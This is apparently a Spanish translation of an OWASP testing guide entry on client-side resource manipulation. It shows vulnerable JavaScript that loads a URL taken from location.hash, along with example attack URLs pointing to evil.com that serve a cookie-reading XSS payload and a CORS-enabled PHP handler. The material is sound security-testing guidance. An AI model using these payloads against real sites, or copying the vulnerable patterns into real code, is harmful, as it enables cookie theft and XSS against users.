Manipulación de recursos del lado del cliente

ID
WSTG-CLNT-06

Resumen

Una vulnerabilidad de manipulación de recursos del lado del cliente es un fallo de validación de entrada. Ocurre cuando una aplicación acepta entrada controlada por el usuario que especifica la ruta de un recurso, como el origen de un iframe, de JavaScript, de un applet o el manejador de un XMLHttpRequest. Esta vulnerabilidad consiste en la capacidad de controlar las URLs que enlazan con algunos recursos presentes en una página web. El impacto de esta vulnerabilidad varía y suele emplearse para realizar ataques de XSS. Esta vulnerabilidad permite interferir con el comportamiento esperado de la aplicación haciendo que cargue y renderice objetos maliciosos.

El siguiente código JavaScript muestra un posible script vulnerable en el que un atacante puede controlar location.hash (fuente), que llega al atributo src de un elemento script. Este caso particular conduce a un ataque de XSS, ya que podría inyectarse JavaScript externo.

<script>
    var d=document.createElement("script");
    if(location.hash.slice(1)) {
        d.src = location.hash.slice(1);
    }
    document.body.appendChild(d);
</script>

Un atacante podría dirigirse a una víctima haciendo que visite esta URL:

www.victim.com/#https://evil.com/js.js

Donde js.js contiene:

alert(document.cookie)

Esto haría que la alerta aparezca en el navegador de la víctima.

Un escenario más dañino implica la posibilidad de controlar la URL invocada en una petición CORS. Dado que CORS permite que el recurso de destino sea accesible por el dominio solicitante mediante un enfoque basado en cabeceras, el atacante puede pedir a la página objetivo que cargue contenido malicioso desde su propio sitio web.

Este es un ejemplo de una página vulnerable:

<b id="p"></b>
<script>
    function createCORSRequest(method, url) {
        var xhr = new XMLHttpRequest();
        xhr.open(method, url, true);
        xhr.onreadystatechange = function () {
            if (this.status == 200 && this.readyState == 4) {
                document.getElementById('p').innerHTML = this.responseText;
            }
        };
        return xhr;
    }

    var xhr = createCORSRequest('GET', location.hash.slice(1));
    xhr.send(null);
</script>

El location.hash está controlado por la entrada del usuario y se utiliza para solicitar un recurso externo, que luego se refleja mediante la construcción innerHTML. Un atacante podría pedir a una víctima que visite la siguiente URL:

www.victim.com/#https://evil.com/html.html

Con el manejador del payload para html.html:

<?php
header('Access-Control-Allow-Origin: https://www.victim.com');
?>
<script>alert(document.cookie);</script>

Objetivos de la prueba

  • Identificar sinks con validación de entrada débil.
  • Evaluar el impacto de la manipulación de recursos.

Cómo probar

Para comprobar manualmente este tipo de vulnerabilidad, hay que identificar si la aplicación emplea entradas sin validarlas correctamente. De ser así, estas entradas están bajo el control del usuario y podrían usarse para especificar recursos externos. Dado que hay muchos recursos que podrían incluirse en la aplicación (como imágenes, video, objetos, CSS e iframes), se deben investigar los scripts del lado del cliente que manejan las URLs asociadas en busca de posibles problemas.

La siguiente tabla muestra los posibles puntos de inyección (sink) que se deben comprobar:

Tipo de recurso Etiqueta/Método Sink
Frame iframe src
Enlace a href
Petición AJAX xhr.open(method, [url], true); URL
CSS link href
Imagen img src
Objeto object data
Script script src

Los más interesantes son aquellos que permiten a un atacante incluir código del lado del cliente (por ejemplo JavaScript) que podría conducir a vulnerabilidades de XSS.
